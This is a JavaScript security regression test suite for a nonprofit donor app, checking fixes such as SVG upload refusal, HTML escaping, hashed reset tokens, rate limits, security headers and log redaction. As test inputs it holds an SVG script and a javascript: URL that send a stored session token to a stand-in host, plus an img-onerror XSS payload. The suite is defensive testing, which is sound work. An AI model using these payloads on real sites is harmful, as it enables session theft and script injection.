// tests/security.test.js — SECURE-1. THE HOLES A HOSTILE REVIEWER FOUND, KEPT SHUT.
//
// One section per fix, in the order they were fixed (worst first). Every
// section was run against main before its fix and went red there; the PR
// lists which assertion failed on main and why.
//
//   §1  No SVG is stored, and every stored file is served as an image only
//       (nosniff + a sandbox CSP), so a logo cannot run script on our domain.
//   §2  Forcing the notification retry (it runs over EVERY org) is a super
//       admin's, never an org admin's.
//   §3  A donor's name merged into email HTML is text, not markup.
//   §4  Staff cannot take the whole org's data, and cannot delete a gift or a
//       grant someone else entered. The person who entered it still can.
//   §5  A server whose database is not on this machine will not start without
//       a real signing secret.
//   §6  The no-login cancel link expires, and a staff reset token is stored
//       only as its hash (the stored value is not itself a working token).
//   §7  Invite links and import previews have their own rate limits.
//   §8  A large request body is read only for someone signed in.
//   §9  Every API answer carries nosniff, Referrer-Policy, HSTS and a
//       frame-ancestors policy; a CORS preflight is cached.
//   §10 A stored website is http(s) or nothing; never javascript:.
//
// SECURE-2 (2026-10-29) adds, each run red against main first:
//   §11 No donor or staff details, token or body in a log line or a Sentry
//       event: a second server is booted with its output captured and Sentry
//       pointed at a local sink, then driven through a failed sign-in, an
//       import, a gift and a thrown error carrying planted values.
//
// Standard scratch stack (tests/README.md). Fixtures are the suite's own org.

const crypto = require("crypto");
const path = require("path");
const { spawnSync, spawn } = require("child_process");
const http = require("http");
const net = require("net");
const bcrypt = require("bcryptjs");
const { ok, summary, login, api, q, BASE } = require("./helpers");

const ORG = "org_secure1";
const ADMIN = "u_secure1_admin", STAFF = "u_secure1_staff";
const ADMIN_EMAIL = "admin@secure1.example.org", STAFF_EMAIL = "staff@secure1.example.org";
const DONOR = "d_secure1";
const { testNow, civilDay } = require("./clock");
const TODAY = civilDay();

const PNG_1x1 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
const EVIL_SVG = Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>fetch("//x.invalid/?"+localStorage.npe_token)</script></svg>`).toString("base64");

async function fixtures() {
  for (const t of ["password_reset_tokens"]) await q(`DELETE FROM ${t} WHERE user_id IN ($1,$2)`, [ADMIN, STAFF]).catch(() => {});
  // Every table that carries an org_id, discovered, twice over (children first
  // the second time round); append-only audit rows simply stay.
  const tables = (await q(`SELECT table_name FROM information_schema.columns WHERE column_name='org_id' AND table_schema='public'`)).map(r => r.table_name);
  for (let pass = 0; pass < 2; pass++)
    for (const t of tables) await q(`DELETE FROM "${t}" WHERE org_id=$1`, [ORG]).catch(() => {});
  await q(`DELETE FROM orgs WHERE id=$1`, [ORG]).catch(() => {});
  if ((await q(`SELECT 1 FROM orgs WHERE id=$1`, [ORG])).length) {
    // A row we could not remove (append-only audit): keep the org, reset its users.
    await q(`DELETE FROM users WHERE org_id=$1`, [ORG]).catch(() => {});
  }
  await q(`INSERT INTO orgs (id,name,org_slug,onboarding_complete,subscription_status,plan) VALUES ($1,'Secure One Food Pantry','secure-one-pantry',1,'trialing','team')
           ON CONFLICT (id) DO UPDATE SET website=NULL, subscription_status='trialing', plan='team'`, [ORG]);
  const hash = bcrypt.hashSync("loadtest1234", 10);
  await q(`INSERT INTO users (id,org_id,email,password_hash,name,role) VALUES ($1,$2,$3,$4,'Renata Okafor','admin')`, [ADMIN, ORG, ADMIN_EMAIL, hash]);
  await q(`INSERT INTO users (id,org_id,email,password_hash,name,role) VALUES ($1,$2,$3,$4,'Dale Whitcombe','staff')`, [STAFF, ORG, STAFF_EMAIL, hash]);
  await q(`INSERT INTO donors (id,org_id,name,email,stage,total_giving,created_by,created_by_name) VALUES ($1,$2,'Imelda Vance','imelda.vance@example.org','active',0,'system:test','test')`, [DONOR, ORG]);
}

(async () => {
  await fixtures();
  const admin = await login(ADMIN_EMAIL);
  const staff = await login(STAFF_EMAIL);

  console.log("\n§1 · no SVG, and stored files are served as images only");
  {
    const svg = await api("POST", "/pictures/upload", staff, { image: `data:image/svg+xml;base64,${EVIL_SVG}` });
    ok("an SVG upload is refused (400)", svg.status === 400, { status: svg.status, body: svg.body });
    const brand = await api("PUT", "/orgs/branding", admin, { logoData: `data:image/svg+xml;base64,${EVIL_SVG}` });
    ok("an SVG org logo is refused (400)", brand.status === 400, { status: brand.status, body: brand.body });
    const png = await api("POST", "/pictures/upload", staff, { image: `data:image/png;base64,${PNG_1x1}` });
    ok("a PNG upload is still taken", png.status === 200 && /^\/portal-assets\//.test(png.body.url || ""), png.body);
    if (png.body && png.body.url) {
      const r = await fetch(BASE + png.body.url, { headers: { Authorization: "Bearer " + staff } });
      ok("a stored file is served with nosniff", r.headers.get("x-content-type-options") === "nosniff", r.headers.get("x-content-type-options"));
      ok("…and with a sandbox CSP, so opened on its own nothing in it runs",
        /sandbox/.test(r.headers.get("content-security-policy") || "") && /default-src 'none'/.test(r.headers.get("content-security-policy") || ""),
        r.headers.get("content-security-policy"));
    }
  }

  console.log("\n§2 · the all-org notification retry is a super admin's");
  {
    const r = await api("POST", "/admin/notifications/retry", admin, { force: true });
    ok("an org admin forcing the all-org retry is refused (403)", r.status === 403, { status: r.status, body: r.body });
  }

  console.log("\n§3 · a donor's name in email HTML is text");
  {
    const T = await import(path.join(__dirname, "..", "shared", "emailTemplates.js"));
    const evil = `<img src=x onerror="alert(1)">`;
    const html = T.renderMergeFields("<p>Dear {{first_name}},</p><p>{{donor_name}}</p>", { first_name: evil, donor_name: evil + " Vance" });
    ok("no markup from a merged name reaches the HTML", !/<img/i.test(html) && /&lt;img/.test(html), html);
    const subj = T.renderMergeFields("Thank you, {{first_name}}", { first_name: "Ana & Luis" }, { text: true });
    ok("a subject (text) is filled as typed", subj === "Thank you, Ana & Luis", subj);
  }

  console.log("\n§4 · staff can't take everything or delete what someone else entered");
  {
    const ex = await api("GET", "/org/export", staff);
    ok("staff whole-org JSON export is refused (403)", ex.status === 403, { status: ex.status });
    const exA = await api("GET", "/org/export", admin);
    ok("an admin still exports", exA.status === 200, { status: exA.status });

    const gA = await api("POST", `/donors/${DONOR}/gifts`, admin, { amount: 125, date: TODAY, type: "one-time" });
    const giftByAdmin = gA.body && (gA.body.id || (gA.body.gift && gA.body.gift.id));
    ok("(fixture) the admin enters a gift", !!giftByAdmin, gA.body);
    const del = await api("DELETE", `/gifts/${giftByAdmin}`, staff);
    ok("staff deleting a gift an admin entered is refused (403)", del.status === 403, { status: del.status, body: del.body });
    const still = await q(`SELECT id FROM gifts WHERE id=$1 AND org_id=$2`, [giftByAdmin, ORG]);
    ok("…and the gift is still there", still.length === 1);

    const gS = await api("POST", `/donors/${DONOR}/gifts`, staff, { amount: 40, date: TODAY, type: "one-time" });
    const giftByStaff = gS.body && (gS.body.id || (gS.body.gift && gS.body.gift.id));
    const delOwn = await api("DELETE", `/gifts/${giftByStaff}`, staff);
    ok("staff may still delete a gift they entered themselves", delOwn.status === 200, { status: delOwn.status, body: delOwn.body });

    const grA = await api("POST", "/grants", admin, { funder: "Lakeshore Community Foundation", amount: 15000, status: "pending" });
    const grantId = grA.body && (grA.body.id || (grA.body.grant && grA.body.grant.id));
    ok("(fixture) the admin enters a grant", !!grantId, grA.body);
    const delG = await api("DELETE", `/grants/${grantId}`, staff);
    ok("staff deleting a grant an admin entered is refused (403)", delG.status === 403, { status: delG.status });
  }

  console.log("\n§5 · no server off this machine starts without a real signing secret");
  {
    const boot = env => spawnSync(process.execPath, ["-e", "require('./auth'); process.exit(0)"], {
      cwd: path.join(__dirname, ".."), timeout: 20000, encoding: "utf8",
      env: { PATH: process.env.PATH, DATABASE_URL: "postgresql://app:pw@db.secure1.invalid:5432/steward", ...env },
    });
    const none = boot({});
    ok("no JWT_SECRET, remote database: refuses to start", none.status !== 0, { status: none.status });
    const dev = boot({ JWT_SECRET: "nonprofit_erp_secret_dev" });
    ok("the repo's development secret, remote database: refuses to start", dev.status !== 0, { status: dev.status });
    const good = boot({ JWT_SECRET: crypto.randomBytes(48).toString("base64url") });
    ok("a long random secret starts", good.status === 0, { status: good.status, err: (good.stderr || "").slice(0, 300) });
  }

  console.log("\n§6 · the cancel link expires; a reset token is stored only as its hash");
  {
    const secret = process.env.RECOVERY_SECRET || process.env.JWT_SECRET || "local-test-secret";
    const mk = obj => {
      const payload = Buffer.from(JSON.stringify(obj)).toString("base64url");
      return payload + "." + crypto.createHmac("sha256", secret).update("cancel:" + payload).digest("base64url");
    };
    const old = await fetch(`${BASE}/billing/cancel/${mk({ cancelOrgId: ORG, exp: testNow() - 86400000 })}`);
    ok("an expired cancel link is refused (400)", old.status === 400, old.status);
    const live = await fetch(`${BASE}/billing/cancel/${mk({ cancelOrgId: ORG, exp: testNow() + 86400000 })}`);
    ok("a current cancel link still opens the confirm page", live.status === 200, live.status);

    await api("POST", "/auth/forgot-password", null, { email: STAFF_EMAIL });
    const [row] = await q(`SELECT token FROM password_reset_tokens WHERE user_id=$1 AND used=false ORDER BY expires_at DESC LIMIT 1`, [STAFF]);
    ok("the reset token is stored as a hash", !!row && /^h1:[0-9a-f]{64}$/.test(row.token), row && row.token.slice(0, 6));
    const replay = await api("POST", "/auth/reset-password", null, { token: row ? row.token : "x", password: "hijacked12345" });
    ok("the stored value is not a working reset token", replay.status === 400, { status: replay.status });
  }

  console.log("\n§7 · invite links and import previews have their own limits");
  {
    const enforce = { "x-test-enforce-limits": "1" };
    let firstInvite429 = 0;
    for (let i = 1; i <= 32 && !firstInvite429; i++) {
      const r = await fetch(`${BASE}/auth/invite/${crypto.randomBytes(16).toString("hex")}`, { headers: enforce });
      if (r.status === 429) firstInvite429 = i;
    }
    ok("guessing invite links meets a 429 within 31 tries", firstInvite429 > 0 && firstInvite429 <= 31, firstInvite429);
    let firstImport429 = 0;
    for (let i = 1; i <= 62 && !firstImport429; i++) {
      const r = await fetch(`${BASE}/history-import/preview`, { method: "POST", headers: { ...enforce, "Content-Type": "application/json", Authorization: "Bearer " + staff }, body: "{}" });
      if (r.status === 429) firstImport429 = i;
    }
    ok("import previews meet a 429 within 61 tries", firstImport429 > 0 && firstImport429 <= 61, firstImport429);
  }

  console.log("\n§8 · a large body is read only for someone signed in");
  {
    const big = JSON.stringify({ rows: [{ note: "x".repeat(8 * 1024 * 1024) }] });
    const anon = await fetch(`${BASE}/history-import/preview`, { method: "POST", headers: { "Content-Type": "application/json" }, body: big });
    ok("an 8 MB body with no session is refused before parsing (413)", anon.status === 413, anon.status);
    const signed = await fetch(`${BASE}/history-import/preview`, { method: "POST", headers: { "Content-Type": "application/json", Authorization: "Bearer " + admin }, body: big });
    ok("…and the same body from a signed-in admin is read (not 413)", signed.status !== 413, signed.status);
  }

  console.log("\n§9 · every API answer carries the security headers; preflights are cached");
  {
    const r = await fetch(`${BASE}/health`);
    ok("nosniff", r.headers.get("x-content-type-options") === "nosniff");
    ok("Referrer-Policy", r.headers.get("referrer-policy") === "strict-origin-when-cross-origin", r.headers.get("referrer-policy"));
    ok("HSTS", /max-age=\d{7,}/.test(r.headers.get("strict-transport-security") || ""), r.headers.get("strict-transport-security"));
    ok("frame-ancestors limits who may frame a page", /frame-ancestors 'self'/.test(r.headers.get("content-security-policy") || "") && !/\*/.test(r.headers.get("content-security-policy") || ""), r.headers.get("content-security-policy"));
    ok("no X-Powered-By", !r.headers.get("x-powered-by"));
    const pre = await fetch(`${BASE}/donors`, { method: "OPTIONS", headers: { Origin: "https://www.stewardapp.dev", "Access-Control-Request-Method": "GET", "Access-Control-Request-Headers": "authorization" } });
    ok("a preflight is cached (Access-Control-Max-Age)", Number(pre.headers.get("access-control-max-age")) >= 600, pre.headers.get("access-control-max-age"));
  }

  console.log("\n§10 · a stored website is a web address and nothing else");
  {
    const bad = await api("PATCH", `/orgs/${ORG}`, admin, { website: "javascript:fetch('//x.invalid/?'+localStorage.npe_token)" });
    ok("a javascript: website is refused (400)", bad.status === 400, { status: bad.status, body: bad.body });
    const [o] = await q(`SELECT website FROM orgs WHERE id=$1`, [ORG]);
    ok("…and nothing was stored", !o.website || !/^javascript:/i.test(o.website), o.website);
    const good = await api("PATCH", `/orgs/${ORG}`, admin, { website: "secureonepantry.org" });
    const [o2] = await q(`SELECT website FROM orgs WHERE id=$1`, [ORG]);
    ok("a bare domain is kept, as https", good.status === 200 && o2.website === "https://secureonepantry.org", { status: good.status, website: o2.website });
  }

  console.log("\n§11 · no donor details, tokens or bodies in a log line or a Sentry event");
  {
    const PLANT = { name: "Quillon Marchbanks", email: "quillon.marchbanks@planted.example", phone: "(859) 555-0142",
      street: "4417 Tates Creek Road", password: "Pl4nted-Passw0rd-zq", staffEmail: "wrenna.ashgrove@planted.example" };
    // The Sentry sink: every envelope the child sends lands here, raw.
    const envelopes = [];
    const sink = http.createServer((req, res) => { const b = []; req.on("data", c => b.push(c)); req.on("end", () => { envelopes.push(Buffer.concat(b).toString("utf8")); res.end("{}"); }); });
    await new Promise(r => sink.listen(0, "127.0.0.1", r));
    const freePort = () => new Promise(r => { const s = net.createServer(); s.listen(0, () => { const p = s.address().port; s.close(() => r(p)); }); });
    const port = await freePort();
    const CHILD = `http://localhost:${port}`;
    let out = "";
    const child = spawn(process.execPath, ["server.js"], {
      cwd: path.join(__dirname, ".."),
      env: { ...process.env, PORT: String(port), SENTRY_DSN: `http://publickey@127.0.0.1:${sink.address().port}/1`,
        DATABASE_URL: process.env.DATABASE_URL || "postgresql://steward@localhost:5544/steward_loadtest",
        JWT_SECRET: process.env.JWT_SECRET || "local-test-secret", TEST_MODE: "1", DISABLE_BACKGROUND_TICKS: "1", SESSION_CACHE_TTL_MS: "0",
        NODE_ENV: "test", RESEND_API_KEY: process.env.RESEND_API_KEY || "re_dummy_local",
        // Mail from this server goes nowhere: a closed local port, never the sink or a real provider.
        RESEND_BASE_URL: "http://127.0.0.1:9" },
    });
    child.stdout.on("data", d => { out += d; });
    child.stderr.on("data", d => { out += d; });
    let up = false;
    for (let i = 0; i < 120 && !up; i++) { try { up = (await fetch(CHILD + "/health")).ok; } catch { /* booting */ } if (!up) await new Promise(r => setTimeout(r, 500)); }
    ok("the captured server booted", up, out.slice(-400));
    const call = (method, p, tok, body) => fetch(CHILD + p, { method, headers: { "Content-Type": "application/json", ...(tok ? { Authorization: "Bearer " + tok } : {}) }, body: body ? JSON.stringify(body) : undefined });
    // A failed sign-in (a planted address and password).
    await call("POST", "/auth/login", null, { email: PLANT.staffEmail, password: PLANT.password });
    await call("POST", "/auth/login", null, { email: ADMIN_EMAIL, password: PLANT.password });
    const lr = await (await call("POST", "/auth/login", null, { email: ADMIN_EMAIL, password: "loadtest1234" })).json();
    const tok = lr.token;
    ok("…and an admin signed in to it", !!tok, lr);
    // An import carrying a whole planted person.
    await call("POST", "/donors/import", tok, { donors: [{ name: PLANT.name, email: PLANT.email, phone: PLANT.phone, address: PLANT.street, city: "Lexington", state: "KY" }] });
    // A gift whose note names them.
    await call("POST", `/donors/${DONOR}/gifts`, tok, { amount: 25, date: TODAY, notes: `In memory of ${PLANT.name}, ${PLANT.street}` });
    // A thrown error whose message carries the shaped values and a token in the URL.
    const thrown = await call("POST", `/admin/debug/sentry-test?mode=route&token=${tok}`, tok, { note: `${PLANT.email} ${PLANT.phone} ${PLANT.street} ${tok}` });
    ok("the thrown error answered 500 with a request id", thrown.status === 500 && /^[A-Za-z0-9_-]{6,}$/.test(thrown.headers.get("x-request-id") || ""), thrown.status);
    for (let i = 0; i < 40 && !envelopes.some(e => /sentry-test/.test(e)); i++) await new Promise(r => setTimeout(r, 250));
    child.kill("SIGTERM");
    await new Promise(r => setTimeout(r, 300));
    sink.close();
    const sentry = envelopes.join("\n");
    ok("Sentry received the thrown error (so this section can see what it would carry)", /sentry-test/.test(sentry), envelopes.length);
    ok("the log line keeps the route and the request id", new RegExp(`\\[500\\] POST /admin/debug/sentry-test rid=${thrown.headers.get("x-request-id")}`).test(out), out.split("\n").filter(l => /\[500\]/.test(l)).slice(0, 2));
    const planted = { ...PLANT, phoneDigits: "555-0142", token: tok, tokenTail: tok.slice(-24) };
    for (const [what, v] of Object.entries(planted)) {
      ok(`no ${what} in the server's log`, !out.includes(v), out.split("\n").filter(l => l.includes(v)).slice(0, 2).map(l => l.slice(0, 200)));
      ok(`no ${what} in the Sentry payload`, !sentry.includes(v), (sentry.match(new RegExp(".{0,80}" + v.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + ".{0,40}")) || [])[0]);
    }
    ok("no request body, cookie or authorization header in the Sentry payload", !/"data":\{"note"|"cookies"|"authorization"/i.test(sentry));
  }

  summary();
})().catch(e => { console.error(e); process.exit(1); });
